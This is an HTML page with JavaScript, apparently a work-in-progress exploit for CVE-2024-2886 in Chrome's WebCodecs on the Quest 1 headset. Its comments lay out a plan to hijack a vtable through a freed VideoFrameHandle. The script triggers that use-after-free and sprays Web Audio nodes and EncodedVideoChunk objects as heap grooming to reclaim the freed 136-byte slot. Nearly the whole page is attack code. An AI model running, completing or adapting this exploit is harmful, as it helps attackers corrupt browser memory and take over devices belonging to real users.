<!doctype html>
<html>
<head><title>q1shell</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
<div id="out"></div>
<script>
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
log('CVE-2024-2886 - vtable hijack attempt');
log('');

// WHAT WE KNOW:
// - VideoFrameHandle freed by close() → Oilpan 136-byte slot
// - vtable dispatch at libchrome.so+0x29358d4: ldr x8,[x20]; ldr x8,[x8,#0x20]; blr x8
// - x20 = freed VideoFrameHandle
// - offset 0 of handle = vtable ptr
// - vtable+0x20 = function pointer called with x0=handle, args from CopyToOptions
//
// GOAL: reclaim freed VideoFrameHandle with controlled data
// so vtable ptr at offset 0 points to our fake vtable
// and fake vtable[0x20] points to... what?
//
// On Quest 1 (ARM64, no PAC), we just need any code address.
// The browser has shell_exec. But we're in the RENDERER, not browser process.
// Even so, crash = tombstone = we learn the freed object address.

async function attempt() {
    const canvas = new OffscreenCanvas(64, 64);
    const gl = canvas.getContext('webgl');
    const audioCtx = new AudioContext();

    // Baseline
    gl.clearColor(1.0, 0.0, 0.0, 1.0);
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.finish();
    const bf = new VideoFrame(canvas, {timestamp:0});
    const bb = new Uint8Array(bf.allocationSize());
    await bf.copyTo(bb); bf.close();
    log('baseline: ' + Array.from(bb.slice(0,4)).map(x=>x.toString(16).padStart(2,'0')).join(' '));

    // Try multiple grooming objects - GainNode, OscillatorNode, AnalyserNode
    // One of them might be 136 bytes in Chrome 112 Oilpan
    const nodeTypes = ['gain', 'oscillator', 'analyser'];
    
    for (const type of nodeTypes) {
        log('trying ' + type + ' node grooming...');
        
        // Free 2000 slots
        const nodes = [];
        for (let i = 0; i < 2000; i++) {
            if (type === 'gain') nodes.push(audioCtx.createGain());
            else if (type === 'oscillator') nodes.push(audioCtx.createOscillator());
            else nodes.push(audioCtx.createAnalyser());
        }
        nodes.length = 0;

        let groomed = 0;
        for (let a = 0; a < 30; a++) {
            gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
            const f = new VideoFrame(canvas, {timestamp: a*1000});
            const buf = new Uint8Array(f.allocationSize());
            const p = f.copyTo(buf);
            f.close();
            // spray
            const s = [];
            for (let j=0;j<20;j++) {
                if (type==='gain') s.push(audioCtx.createGain());
                else if (type==='oscillator') s.push(audioCtx.createOscillator());
                else s.push(audioCtx.createAnalyser());
            }
            await p; s.length=0;
            if (buf.some((b,i)=>b!==bb[i])) {
                groomed++;
                log('  [!] GROOMED with ' + type + ' on attempt ' + a);
                log('  bytes: ' + Array.from(buf.slice(0,8)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
            }
        }
        log('  result: ' + groomed + '/30 groomed with ' + type);
    }

    // Also try EncodedVideoChunk and AudioData
    log('trying EncodedVideoChunk...');
    {
        const chunks = [];
        const fakeData = new Uint8Array(32).fill(0x41);
        for (let i=0;i<2000;i++) {
            chunks.push(new EncodedVideoChunk({type:'key',timestamp:i,data:fakeData}));
        }
        chunks.length=0;
        let groomed=0;
        for (let a=0;a<20;a++) {
            gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
            const f=new VideoFrame(canvas,{timestamp:a*1000});
            const buf=new Uint8Array(f.allocationSize());
            const p=f.copyTo(buf); f.close();
            const s=[];
            for(let j=0;j<20;j++) s.push(new EncodedVideoChunk({type:'key',timestamp:j,data:fakeData}));
            await p; s.length=0;
            if(buf.some((b,i)=>b!==bb[i])){groomed++;log('  [!] EncodedVideoChunk groomed attempt '+a);}
        }
        log('  result: '+groomed+'/20');
    }

    log('');
    log('If any type shows groomed > 0:');
    log('That type is our spray object!');
    log('Next: control the content of that object');
    log('to fake vtable ptr at byte 0 of the 136-byte slot');
}

attempt().catch(e=>log('ERR: '+e));
</script>
</body>
</html>
